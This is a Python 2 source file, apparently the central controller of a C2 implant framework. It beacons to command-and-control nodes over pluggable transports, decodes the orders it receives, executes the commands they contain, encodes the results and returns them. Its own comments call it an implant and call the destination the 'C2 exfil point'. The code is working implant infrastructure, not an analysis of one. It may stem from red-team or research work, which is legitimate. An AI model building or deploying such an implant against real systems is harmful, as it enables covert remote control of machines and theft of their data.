
#
# This is the application controller that manages the calls through all the different types of modules
#
import config
import inspect
import sys
import warnings
from command_object import CommandObject
from order import Order

class Controller:
    
    beacon_map = {}
    decoder_list = {} # list
    command_map = {}
    encoder_list = {} # list
    response_map = {}
    
    def __init__(self, beacons, commands, decoders, encoders, responders):
        
        self.build_handlers(beacons, commands, decoders, encoders, responders)
    
    # ###############
    # UTILITIES
    # ###############
    
    @staticmethod
    def get_module_class(module):
        """
        gets the class object of the module .py file
        """
        try:
            for name, obj in inspect.getmembers(module):
                # must check for parent module name (should be beacon/codec/etc) as to avoid imported class objects
                if inspect.isclass(obj) and obj.__module__ == module.__name__:
                    return obj
                    # have it instantiate the object? depends where I decide to use this method: obj_() creates an instance.
        except Exception, e:
            print "Error getting class from %s module" % (module.__name__)
            raise

    @staticmethod
    def easy_import(pkg_name, module_name):
        """
        Dynamically imports a class from a given module
        """
        try:
            pkg = __import__(pkg_name, fromlist=[module_name])
        except ImportError ,e:
            print "Erorr importing %s from %s" % (module_name, pkg_name)
            raise
        module = getattr(pkg,module_name)
        return Controller.get_module_class(module)
    
    @staticmethod
    def abstract_builder(pkg_name, name_list, return_list = False):
        """
        This function will build lists or dictionaries of modules to be used by the controller's handlers
        """
        # some handlers needs dicts (commands, beacons), while some need lists (encoders,decoders, etc)
        if return_list:
            ret_val = []
        else:
            ret_val = {}
        
        # Go through the string names and get the appropriate Class from the appropriate module.
        # Once you have that, do a dynamic import so we can use it, then map that class type
        # so we can instantiate the appropriate instance when going through a beaconing interation.
        for module_name in name_list:

            module_class = Controller.easy_import(pkg_name, module_name) # imports the class
            if return_list:
                ret_val.append(module_class) # adds the Class object to a list
            else:
                ret_val[module_name] = module_class # maps the Class object to the appropriate module name
            
        return ret_val
    
    @staticmethod
    def recursive_convert_to_cmd_objects(data):
        """
        This function will turn the decoded beaconed data and turn it into a list of CommandObjects. See the CommandObject
        DOCSTRING for details on how it parses the data.
        
        This function will fail gracefully. Would rather not execute a badly decoded command than crash the process.
        """
        com_objs = []
        
        try: 
            if type(data) is list or type(data) is tuple:
                
                for com in data:
                    com_objs.append(Controller.recursive_convert_to_cmd_objects(com))
            
            elif isinstance(data,basestring) or type(data) is dict:
                new_co = CommandObject(data)
                com_objs.append(new_co)

            else:
                print config.COD_PROMPT + 'Command Data was not formatted as dict, list/tuple, string! type is %s' % type(data)
                raise
            
            ## NOTE: If nested multiple commands breaks, this is likely the culprit
            if len(com_objs) == 1:
                com_objs = com_objs[0]
                
        except Exception, e:
                print e
                print config.COD_PROMPT + " Issue in format while trying to translate to CommandObject %s" % (data)

        return com_objs
    
    @staticmethod
    def recursive_retrieve_cmd_results(com_objs):

        agg_results = []
        for cur_obj in com_objs:
            if type(cur_obj) is list:
                results = Controller.recursive_retrieve_cmd_results(cur_obj)
            else:
                results = cur_obj.get_results()
            agg_results.append(results)
        return agg_results
    
    # ###############    
    # HANDLER BUILDERS
    # ###############
    
    # Note:
    # I added these facades because I am unsure how this architecture will work in the long run.
    # Hence, I am using a ludicrous number of functions and facades.
    
    def build_beacon_handler(self, beacons):
        return Controller.abstract_builder(config.BEACON_PKG, beacons)

    def build_command_handler(self, commands):
        return Controller.abstract_builder(config.COMMAND_PKG, commands)
    
    def build_decoder_handler(self, decoders):
        return Controller.abstract_builder(config.DECODER_PKG, decoders, True) #return a list
        
    def build_encoder_handler(self, encoders):
        return Controller.abstract_builder(config.ENCODER_PKG, encoders, True) #return a list
        
    def build_responder_handler(self, responders):
        return Controller.abstract_builder(config.RESPONDER_PKG, responders)
    
    def build_handlers(self, beacons, commands, decoders, encoders, responders):
        # this function is used by the constructor to setup the dictionaries with the command to command object mapping.
        self.beacon_map = self.build_beacon_handler(beacons)
        self.command_map = self.build_command_handler(commands)
        self.decoder_list = self.build_decoder_handler(decoders)
        self.encoder_list = self.build_encoder_handler(encoders)
        self.response_map = self.build_responder_handler(responders)
    
    # ###############
    # HANDLER CALLERS
    # ###############
    
    def handle_beacon(self, nodes):
        """
        This function will go through the nodes, instantiating the appropriate module object and attempt
        to beacon out in succession to the supplied Nodes. It will fail our it no nodes are available.
        """
        # 
        # nodes example:
        # list of tuples, where each tuples first value is a string of the beacon type and second value is a dictionary of arguments
        # [('http_get',{'node':'192.168.2.2','port':'80','path':'/index.html','timeout':'10'})]
        #
        
        print config.BEAC_PROMPT + " beaconing..."
        
        try:
            
            success = False
            # Should I randomize the order of nodes? this is a potential behavior that could be defined.
            for node in nodes:
                beacon_type = node[config.BEACON_TYPE_IND]
                params = node[config.PARAMS_IND]
                
                ip = params.get(config.NODE_IP_KEY)
                port = params.get(config.NODE_PORT_KEY)
        
                beaconer_class = self.beacon_map.get(beacon_type) # get this from the beacon map based on beacon type
                beaconer = beaconer_class() # instantiate the object
                try:
                    success, response = beaconer.beacon(params)
                except Exception, e:
                    print "%s Error connecting to %s:%s" % (config.BEAC_PROMPT, ip, port)
                    success = False
                
                # generate a 'bean' called Orders to act as a sort of 'cookie' between handlers
                if success:
                    print "%s Successfully retrieved data from %s:%s" % (config.BEAC_PROMPT, ip, port)
                    order = Order()
                    order.node = node
                    order.node_ip = ip
                    order.node_port = port
                    order.node_type = beacon_type
                    order.node_params = params
                    order.raw_response = response
                    
                    return (success, order)
                else:
                    # Will not all failures raise an exception? Perahsp this should be forced implementation by all Beaconers?
                    # print "%s Failed to retrieve data from %s:%s" % (BEAC_PROMPT, ip, port)
                    # Should I pause here or just continue?
                    pass
                
            # What do I do if none of the nodes worked?
            return (False, None)
        except TypeError as e:
            print "No such class for provided beacon type: %s" % (beacon_type)
            raise e
        except Exception,e :
            raise e
    
    def recursive_decoder(self, decoder, encoded_data, full_body = False):
        """
        this method is currently used by both the decoder and encoder handlers. I will not change
        the names of the variables or the method to be more agnostic until I am sure that the encoders
        work successfully
        
        The 'full_body' flag indicates that the codec should be applied to the entire data set as a single entity.
        If left to be False, the default behavior is to apply the codec to each iterable object independently.
        """
        decoded_data = []
        
        success = True
        
        try:
            
            #If string or full_body flag is set, apply the codec to the entire body of data
            if isinstance(encoded_data,basestring) or full_body:
                decoded_data.append(decoder(encoded_data))

            # if its a dictionary, apply codec to the key and also the value. If the value is a container, call recursive decoder.
            elif type(encoded_data) is dict:
                
                    decoded_portion = {}
                    for encoded_key, encoded_value in encoded_data.items():
                        decoded_key = decoder(encoded_key)
                        
                        if type(encoded_value) is list or type(encoded_value) is dict:
                            success, data = self.recursive_decoder(decoder, encoded_value)
                            decoded_value = data
                        else:
                            decoded_value = decoder(encoded_value)
                        
                        decoded_portion[decoded_key] = decoded_value

                    decoded_data.append(decoded_portion)
            # If the contents is a list or tuple, recursively decode each element by sending itself to the function
            elif type(encoded_data) is list or type(encoded_data) is tuple:

                for encoded_portion in encoded_data:
                    
                    success, data = self.recursive_decoder(decoder, encoded_portion)
                    if success:
                        decoded_data.append(data)
                    else:
                        return (False, None)
                    
            else:
                print config.COD_PROMPT + 'Data was not formatted as dict, list/tuple, string!'
                raise
            
            ## NOTE: If nested multiple commands breaks, this is likely the culprit
            if len(decoded_data) == 1:
                decoded_data = decoded_data[0]
                
        except Exception, e:
                print config.COD_PROMPT + " Issue in codec while trying to code %s" % (encoded_data)
                return (False, None)
        
        return success, decoded_data
    
    def handle_decode(self, encoded_data):
        """
        This method takes the encoded order and runs it iteratively through each decoder.
        """
        
        config.COD_PROMPT = config.DEC_PROMPT
        print config.DEC_PROMPT + " decoding..."
        
        # while there is another decoder, run each item through the next decoder
        data = encoded_data
        success = False
        for decoder in self.decoder_list:
            current_decoder = decoder()
            success, data = self.recursive_decoder(current_decoder.decode, data)
            if not success:
                break
            print config.DEC_PROMPT + "%s decoded to '%s'" % ( current_decoder.name(),data)
        return success, data
    
    def recursive_execute(self, command):
        """
        this method will run each command from the C2 node. It will also keep track of scope for
        groups of commands that should be ran in batches or otherwise nested groups. Not really useful
        since we will have a hard time undoing any previous command, but it might be interesting to see
        what people come up with.
        """
        type_check = type(command)
        
        success = False

        try:

            if type_check is CommandObject:
                cmd_obj = None
                args = None
                
                cmd = command.name
                cmd_class = self.command_map.get(cmd)
                cmd_obj = cmd_class()
                args = command.args
                print config.CMD_PROMPT + " Executing: %s" % (cmd_obj.name())
                try:
                    success, results = cmd_obj.execute(args)
                except Exception, e:
                    # if error when running execute, just store the error as the result
                    success = False
                    results = e
                
                command.results = results
                command.success = success

            elif type_check is list:
                print config.CMD_PROMPT + " Beginning Sub Command Chain"
                for cur_cmd in command:
                    success = self.recursive_execute(cur_cmd)

                print config.CMD_PROMPT + " Finishing Sub Command Chain"

                    
            else:
                print config.CMD_PROMPT + " Improperly formatted command: %s" % (command)
            
        except Exception, e:
            raise
            
        return success
        
    def handle_command(self, commands):
        """
         Iterates through each commands from the C2 Node's order and executes appropriately.
        """
        print config.CMD_PROMPT + " calling commands..."
        
        success = False

        print config.CMD_PROMPT + " Beginning Command Chain"
        for command in commands:
            success = self.recursive_execute(command)
            # Is there going to be complex results checking and handling code?

        print config.CMD_PROMPT + " Command Chain Completed"
        return success

    
    def handle_encode(self, results):
        """
        Encodes the results of executed commands multiple times in preparation for sending back to the LP/C2 node.
        It is likely that most encoders should do a full_body_encode, to make sure iterable objects containing
        results are appropriately encoded before being sent.
        """
        
        config.COD_PROMPT = config.ENC_PROMPT
        print config.ENC_PROMPT + " encoding results..."
        
        # while there is another decoder, run each item through the next decoder
        data = results
        success = False
        for encoder in self.encoder_list:
            current_encoder = encoder()
            full_body = getattr(current_encoder,'full_body_encode',False)
            success, data = self.recursive_decoder(current_encoder.encode, data, full_body)
            if not success:
                break
            print config.ENC_PROMPT + "%s encoded to '%s'" % ( current_encoder.name(),data)
        return success, data
        
    
    def handle_response(self, order):
        """
        This handler will try to send the results back to the node that issued the commands in the first place.
        """
        print config.RESP_PROMPT + " sending results of order %s..." % (order.uuid)
        node = order.node
        responder_type = node[config.BEACON_TYPE_IND]
        params = node[config.PARAMS_IND]
                
        ip = params.get(config.NODE_IP_KEY)
        port = params.get(config.NODE_PORT_KEY)
        
        responder_class = self.response_map.get(responder_type) # get this from the beacon map based on beacon type
        responder = responder_class() # instantiate the object
        try:
            success = responder.send_response(params, order.response)
        except Exception, e:
            print "%s Error connecting to %s:%s (%s)" % (config.RESP_PROMPT, ip, port, e)
            success = False
            
        return success
        
    
    def handle(self, nodes):
        """
        This calls the appropriate handlers in succession. Beaconers->Decoders->Commands->Encoders->Responders
        """
        success = False
        
        try:
            # Attempt to beacon. Returns an Order object or None.
            success, order = self.handle_beacon(nodes)
            
            # Send response to decoders
            if success:
                success, decoded_data = self.handle_decode(order.raw_response)
            else:
                return False 
            
            # Process command
            if success:
                #Convert the decoded data string into CommandObjects. 
                command_objects = Controller.recursive_convert_to_cmd_objects(decoded_data)
                order.commands = command_objects
                # pass the command objects by reference into the handler. They should then store the results
                success = self.handle_command(order.commands)
            else:
                return False

            # encode response here
            if success:
                results = Controller.recursive_retrieve_cmd_results(order.commands)
                success, encoded_results = self.handle_encode(results)
                order.response = encoded_results
            else:
                return False
            
            # Send response
            if success:
                success = self.handle_response(order)
            else:
                return False
        except Exception, e:
            # Here consider sending back a message to the C2 exfil point, letting them know why the implant died
            # if so, replace the return statements with raise statements and define appropriate exceptions with mesages
            print "%s Exception: %s" % ( config.BASIC_PROMPT, e)
            return False

        return True        
    
    def beacon(self, nodes):
        """
        This facade method is used to start the beaconing process
        """
        result = self.handle(nodes)
        print "%s Beaconing iteration %s" % (config.BASIC_PROMPT,("FAILED", "SUCCEEDED")[result])
        return result
    
    